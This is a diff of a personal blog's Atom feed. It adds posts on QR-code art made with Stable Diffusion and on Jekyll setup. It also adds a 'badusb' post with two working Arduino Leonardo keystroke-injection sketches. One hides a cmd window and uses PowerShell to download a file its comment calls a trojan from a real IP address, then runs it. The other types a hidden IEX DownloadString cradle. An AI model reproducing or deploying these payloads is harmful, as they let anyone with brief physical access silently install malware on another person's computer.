@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-10-12T09:10:52+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">yzyBlog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">Welcome to my yzyBlog!</title><link href="http://localhost:4000/jekyll/update/2023/10/12/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to my yzyBlog!" /><published>2023-10-12T01:36:49+08:00</published><updated>2023-10-12T01:36:49+08:00</updated><id>http://localhost:4000/jekyll/update/2023/10/12/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2023/10/12/welcome-to-jekyll.html"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-10-12T11:18:21+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">yzyBlog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">Welcome to my yzyBlog!</title><link href="http://localhost:4000/jekyll/update/2023/10/12/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to my yzyBlog!" /><published>2023-10-12T01:36:49+08:00</published><updated>2023-10-12T01:36:49+08:00</updated><id>http://localhost:4000/jekyll/update/2023/10/12/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2023/10/12/welcome-to-jekyll.html"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
 
 <p>Jekyll requires blog post files to be named according to the following format:</p>
 
@@ -121,7 +121,74 @@
       <li>无线网络：蓝牙，微波，无线电</li>
     </ul>
   </li>
-</ol>]]></content><author><name></name></author><category term="计组" /><category term="408" /><summary type="html"><![CDATA[计算机网络]]></summary></entry><entry><title type="html">滴水学习</title><link href="http://localhost:4000/pwn/bin/2022/08/24/dishui.html" rel="alternate" type="text/html" title="滴水学习" /><published>2022-08-24T21:06:29+08:00</published><updated>2022-08-24T21:06:29+08:00</updated><id>http://localhost:4000/pwn/bin/2022/08/24/dishui</id><content type="html" xml:base="http://localhost:4000/pwn/bin/2022/08/24/dishui.html"><![CDATA[<h1 id="滴水学习">滴水学习</h1>
+</ol>]]></content><author><name></name></author><category term="计组" /><category term="408" /><summary type="html"><![CDATA[计算机网络]]></summary></entry><entry><title type="html">QRcode</title><link href="http://localhost:4000/bin/qr/2023/08/24/qrcode.html" rel="alternate" type="text/html" title="QRcode" /><published>2023-08-24T22:36:49+08:00</published><updated>2023-08-24T22:36:49+08:00</updated><id>http://localhost:4000/bin/qr/2023/08/24/qrcode</id><content type="html" xml:base="http://localhost:4000/bin/qr/2023/08/24/qrcode.html"><![CDATA[<h1 id="二维码制作">二维码制作</h1>
+
+<h2 id="二维码解析">二维码解析</h2>
+
+<p>在线网站进行二维码解析</p>
+
+<h3 id="二维码生成矢量图">二维码生成矢量图</h3>
+
+<p>https://qrcode.antfu.me/</p>
+
+<p>进行参数调节</p>
+
+<p><img src="C:\Users\17290\OneDrive\桌面\博客文章\photo\image-20230730000316244.png" alt="image-20230730000316244" /></p>
+
+<h2 id="ssh连接webui">ssh连接webui</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-CNg</span> <span class="nt">-L</span> 6006:127.0.0.1:6006 root@222.187.226.110 <span class="nt">-p</span> 31146
+</code></pre></div></div>
+
+<p><img src="C:\Users\17290\OneDrive\桌面\博客文章\photo\image-20230730002459085.png" alt="image-20230730002459085" /></p>
+
+<h3 id="二维码webui生成">二维码webui生成</h3>
+
+<h3 id="主模型">主模型</h3>
+
+<p>revAnimated</p>
+
+<h3 id="prompt">prompt</h3>
+
+<h4 id="风景">风景</h4>
+
+<p>正向词</p>
+
+<p>british columbia, surrounded by mountains and nature, beautiful lakes and rivers, northern lights, volumetric lighting, photorealistic, insanely detailed and intricate, canadian rocky mountains, 8k ultra hd, matte painting, night time, Sweeper3D, Ultra realistic, (35mm style:1. 1), ((best quality)), ((masterpiece)), ((realistic)), radiant light rays, highres, highly detailed, concept art, Exaggeration, Aesthetic, magazine, Backlight, light color , heavenly, shadowy, Realism, octane render, unreal engine 5, Shaders, Denoise, De-Noise, Ambient Occlusion</p>
+
+<p>反向词</p>
+
+<p>(bad-image-v2-39000:0.8), (bad_prompt_version2:0.8), (bad-hands-5:1.1), (EasyNegative:0.8), (NG_DeepNegative_V1_4T:0.8), (bad-artist-anime:0.7),(deformed iris, deformed pupils, bad eyes, semi-realistic:1.4), (worst quality, low quality:1.3), (blurry:1.2), (greyscale, monochrome:1.1), (poorly drawn face), cloned face, cross eyed , extra fingers, mutated hands, (fused fingers), (too many fingers), (missing arms), (missing legs), (extra arms), (extra legs), (poorly drawn hands), (bad anatomy), (bad proportions), cropped, lowres, text, jpeg artifacts, signature, watermark, username, artist name, trademark, watermark, title, multiple view, Reference sheet, long neck, Out of Frame,(Naked, Nude, NSFW, Erotica:2.0), tall trees, floating, floating trees, cartoon, 2d, 3d, duplicates, duplicate, same</p>
+
+<h3 id="迭代步数">迭代步数</h3>
+
+<p>50</p>
+
+<h3 id="采样方法">采样方法</h3>
+
+<p>DPM++ 2M SDE Karras</p>
+
+<h3 id="宽度-高度">宽度 高度</h3>
+
+<p>1024 768</p>
+
+<h3 id="随机种子">随机种子</h3>
+
+<p>-1</p>
+
+<h3 id="adetailer">ADetailer</h3>
+
+<p><img src="C:\Users\17290\OneDrive\桌面\博客文章\photo\image-20230730001243898.png" alt="image-20230730001243898" /></p>
+
+<h3 id="controlnet-v11206">ControlNet v1.1.206</h3>
+
+<p>完美像素模式</p>
+
+<p>模型 control_v1p_sd15_qrcode_monster [a6e58995]</p>
+
+<p>缩放并填充</p>
+
+<p><img src="C:\Users\17290\OneDrive\桌面\博客文章\photo\image-20230730002150892.png" alt="image-20230730002150892" /></p>]]></content><author><name></name></author><category term="bin" /><category term="qr" /><summary type="html"><![CDATA[二维码制作]]></summary></entry><entry><title type="html">滴水学习</title><link href="http://localhost:4000/pwn/bin/2022/08/24/dishui.html" rel="alternate" type="text/html" title="滴水学习" /><published>2022-08-24T21:06:29+08:00</published><updated>2022-08-24T21:06:29+08:00</updated><id>http://localhost:4000/pwn/bin/2022/08/24/dishui</id><content type="html" xml:base="http://localhost:4000/pwn/bin/2022/08/24/dishui.html"><![CDATA[<h1 id="滴水学习">滴水学习</h1>
 
 <h2 id="常用寄存器">常用寄存器</h2>
 
@@ -1123,4 +1190,164 @@ X = 要跳转的地址 - (E8的地址 + 5（指令的宽度）)</p>
 
 <p><strong>特别说明：</strong>												
 当IMAGE_BOUND_IMPORT_DESCRIPTOR结构中的TimeDateStamp与DLL文件标准PE头中的TimeDateStamp值不相符										
-时，或者DLL需要重新定位的时候，就会重新计算IAT中的值.</p>]]></content><author><name></name></author><category term="pwn" /><category term="bin" /><summary type="html"><![CDATA[滴水学习]]></summary></entry></feed>
+时，或者DLL需要重新定位的时候，就会重新计算IAT中的值.</p>]]></content><author><name></name></author><category term="pwn" /><category term="bin" /><summary type="html"><![CDATA[滴水学习]]></summary></entry><entry><title type="html">badusb</title><link href="http://localhost:4000/badusb/bin/2022/08/23/badusb.html" rel="alternate" type="text/html" title="badusb" /><published>2022-08-23T21:06:29+08:00</published><updated>2022-08-23T21:06:29+08:00</updated><id>http://localhost:4000/badusb/bin/2022/08/23/badusb</id><content type="html" xml:base="http://localhost:4000/badusb/bin/2022/08/23/badusb.html"><![CDATA[<h1 id="badusb-制作">badusb 制作</h1>
+
+<h2 id="下载arduino-ide">下载arduino ide</h2>
+
+<p>官网下载arduino ide（www.arduino.cc）</p>
+
+<h2 id="编译badusb代码">编译badusb代码</h2>
+
+<p>1.实现下载执行</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;Keyboard.h&gt;</span><span class="c1"> </span><span class="cp">
+</span><span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
+<span class="c1">// putpower shell your setup code here, to run once</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span><span class="c1">//开始键盘通讯 </span>
+<span class="n">delay</span><span class="p">(</span><span class="mi">1500</span><span class="p">);</span><span class="c1">//延时 </span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_LEFT_GUI</span><span class="p">);</span><span class="c1">//win键 </span>
+<span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="sc">'r'</span><span class="p">);</span><span class="c1">//r键</span>
+<span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span> 
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">KEY_LEFT_GUI</span><span class="p">);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="sc">'r'</span><span class="p">);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_CAPS_LOCK</span><span class="p">);</span><span class="c1">//利用开大写输小写绕过输入法</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">KEY_CAPS_LOCK</span><span class="p">);</span>
+<span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"CMD /T:01 /K @echo off &amp;&amp; mode con:COLS=15 LINES=1"</span><span class="p">);</span>   <span class="c1">//使用最小化隐藏cmd窗口</span>
+<span class="c1">//cmd /c start /minCMD /C START /MIN POWERSHELL -W HIDDEN</span>
+<span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span> 
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span> 
+<span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+<span class="c1">//Keyboard.println("mkdir C:\\test");</span>
+<span class="c1">//Keyboard.press(KEY_RETURN); </span>
+<span class="c1">//Keyboard.release(KEY_RETURN); </span>
+<span class="c1">//delay(1300);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"powershell"</span><span class="p">);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"$clnt = new-object system.net.webclient;"</span><span class="p">);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"$url= 'http://216.83.59.98:8888/down/pu3vURICJ31l';"</span><span class="p">);</span>  <span class="c1">//xxx为你服务器ip，b.ps1为生成的木马文件</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"$file = 'C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">Public</span><span class="se">\\</span><span class="s">Downloads</span><span class="se">\\</span><span class="s">list.exe';"</span><span class="p">);</span>     
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"$clnt.downloadfile($url,$file);start-process C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">Public</span><span class="se">\\</span><span class="s">Downloads</span><span class="se">\\</span><span class="s">list.exe"</span><span class="p">);</span>  
+<span class="c1">//Keyboard.println("powershell.exe -executionpolicy bypass -file  C:\\Users\\Public\\Downloads\\list.exe"); </span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span> 
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+<span class="c1">//delay(3400);</span>
+<span class="c1">//Keyboard.press(KEY_LEFT_GUI);//win键 </span>
+<span class="c1">//delay(500);</span>
+<span class="c1">//Keyboard.press('r');//r键</span>
+<span class="c1">//delay(500); </span>
+<span class="c1">//Keyboard.release(KEY_LEFT_GUI);</span>
+<span class="c1">//Keyboard.release('r');</span>
+<span class="c1">//delay(500);</span>
+<span class="c1">//Keyboard.println("taskkill /t /im conhost.exe /f");</span>
+<span class="c1">//Keyboard.press(KEY_CAPS_LOCK);</span>
+<span class="c1">//Keyboard.release(KEY_CAPS_LOCK);</span>
+<span class="n">Keyboard</span><span class="p">.</span><span class="n">end</span><span class="p">();</span><span class="c1">//结束键盘通讯 </span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{</span>
+  <span class="c1">// put your main code here, to run repeatedly:</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>2.模拟鼠标键盘</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Mouse.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;Keyboard.h&gt;</span><span class="c1"> </span><span class="cp">
+</span><span class="kt">long</span> <span class="n">basic</span><span class="p">;</span>
+<span class="kt">long</span> <span class="n">x</span><span class="p">;</span>
+<span class="kt">long</span> <span class="n">y</span><span class="p">;</span>
+<span class="n">String</span> <span class="n">powershell</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">basic</span><span class="o">=</span><span class="mi">9999999</span><span class="p">;</span> 
+  <span class="n">x</span><span class="o">=</span><span class="mi">5000000</span><span class="p">;</span>
+  <span class="n">y</span><span class="o">=</span><span class="mi">5000000</span><span class="p">;</span>
+  <span class="n">powershell</span><span class="o">=</span><span class="s">"powershell.exe  -WindowStyle Hidden -NoLogo  IEX (New-Object Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/badusb/test.txt');"</span><span class="p">;</span>
+  
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>
+
+  <span class="n">keyboard_gui</span><span class="p">();</span>
+  <span class="n">keyboard_powershell</span><span class="p">();</span>
+  <span class="n">mouse</span><span class="p">();</span>
+
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">end</span><span class="p">();</span>
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">end</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">keyboard_gui</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_LEFT_GUI</span><span class="p">);</span> 
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span> 
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="sc">'r'</span><span class="p">);</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span> 
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">releaseAll</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">keyboard_powershell</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">powershell</span><span class="p">);</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span> 
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">press</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span> 
+  <span class="n">Keyboard</span><span class="p">.</span><span class="n">release</span><span class="p">(</span><span class="n">KEY_RETURN</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">mouse</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>  
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="n">basic</span><span class="p">,</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="n">basic</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> 
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">click</span><span class="p">();</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">click</span><span class="p">();</span>
+  <span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
+  <span class="n">Mouse</span><span class="p">.</span><span class="n">click</span><span class="p">();</span>
+<span class="p">}</span>
+
+
+<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{}</span>
+</code></pre></div></div>
+
+<h2 id="编译连接">编译连接</h2>
+
+<p><img src="C:\Users\17290\OneDrive\桌面\博客文章\photo\image-20230902210200875.png" alt="image-20230902210200875" /></p>
+
+<p>开发板：arduino leonardo</p>
+
+<p>端口：com3</p>]]></content><author><name></name></author><category term="badusb" /><category term="bin" /><summary type="html"><![CDATA[badusb 制作]]></summary></entry><entry><title type="html">Jekyll Blog</title><link href="http://localhost:4000/blog/2022/05/20/jekyll.html" rel="alternate" type="text/html" title="Jekyll Blog" /><published>2022-05-20T22:36:49+08:00</published><updated>2022-05-20T22:36:49+08:00</updated><id>http://localhost:4000/blog/2022/05/20/jekyll</id><content type="html" xml:base="http://localhost:4000/blog/2022/05/20/jekyll.html"><![CDATA[<h1 id="jekyll-blog">Jekyll blog</h1>
+
+<h2 id="新建站点">新建站点</h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jekyll new mysite
+</code></pre></div></div>
+
+<h2 id="安装缺少的gems">安装缺少的gems</h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bundle <span class="nb">install</span>
+</code></pre></div></div>
+
+<h2 id="命令启动本地预览服务器">命令启动本地预览服务器</h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bundle <span class="nb">exec </span>jekyll serve
+</code></pre></div></div>
+
+<h2 id="推送blog到github">推送blog到GitHub</h2>
+
+<p>进入你的 GitHub 仓库文件夹，添加生成的站点文件，并提交更改。然后，将更改推送到 GitHub：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git add <span class="nb">.</span>
+git commit <span class="nt">-m</span> <span class="s2">"Initial commit"</span>
+git push origin master
+</code></pre></div></div>]]></content><author><name></name></author><category term="Blog" /><summary type="html"><![CDATA[Jekyll blog]]></summary></entry></feed>
